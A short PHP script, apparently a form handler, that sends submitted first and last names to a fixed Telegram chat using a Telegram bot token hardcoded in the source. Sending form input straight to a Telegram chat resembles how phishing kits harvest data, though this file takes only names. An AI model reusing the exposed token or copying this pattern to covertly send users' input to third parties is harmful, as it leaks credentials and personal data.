<?php
ngirim($_POST);

function rdx($url, $params){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url . $params);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 3);
    $content = curl_exec($curl);
    curl_close($curl);
    return json_decode($content, true);
}

function ngirim($test){
    $key = 'bot1252919583:AAEQfiUIpYCivB-AkyCzGuOVe35G8MTs1UY';
    $chat = rdx('https://api.telegram.org/' . $key . '/getUpdates', '');

    if ($chat['ok']) {
        $text = 'nama depan = ' . $test['depan'] . ' nama belakang = ' . $test['belakang'];
        $text = urlencode($text);
    }

    return rdx('https://api.telegram.org/' . $key . '/sendMessage', '?chat_id=-410231225&text=' . $text);
}